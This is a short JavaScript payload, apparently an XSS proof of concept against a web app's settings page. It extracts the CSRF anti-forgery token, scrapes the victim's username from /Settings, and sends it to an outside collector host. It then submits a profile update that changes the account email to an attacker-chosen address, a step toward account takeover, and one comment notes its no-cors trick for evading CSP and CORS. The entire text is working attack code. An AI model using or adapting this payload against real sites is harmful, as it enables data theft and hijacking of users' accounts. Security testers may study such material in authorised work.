(async () => {
  try {
    console.log("Execution started...");

    // 1. Extract the Anti-Forgery Token
    const token = document.querySelector('input[name="__RequestVerificationToken"]')?.value;
    if (!token) {
      console.error("CSRF Token not found.");
      return;
    }

    // 2. Fetch the settings page to scrape the current username
    const response = await fetch("/Settings", { credentials: "include" });
    const html = await response.text();
    const doc = new DOMParser().parseFromString(html, "text/html");
    
    const username = doc.querySelector("#ProfileInfo_LoginName-input")?.value || 
                     doc.querySelector('input[name="ProfileInfo.LoginName"]')?.value || 
                     "unknown_user";

    // 3. Exfiltrate data (Added await and encoding)
    console.log(`Exfiltrating username: ${username}`);
    await fetch(`https://e8nqpku10p8gzynraefduguziqohca0z.oastify.com?username=${encodeURIComponent(username)}`, {
      mode: 'no-cors' // Helps bypass some basic CSP/CORS restrictions for simple pings
    });

    // 4. Perform the state-changing action
    const fd = new FormData();
    fd.append("ProfileInfo.Email", "trey@inspectiv.com");
    fd.append("__RequestVerificationToken", token);

    const updateResponse = await fetch("/Settings?handler=UpdateProfileInfo", {
      method: "POST",
      credentials: "include",
      headers: {
        "X-Requested-With": "XMLHttpRequest"
      },
      body: fd
    });

    console.log("Update status:", updateResponse.status);
  } catch (e) {
    console.error("Payload failed:", e);
  }
})();
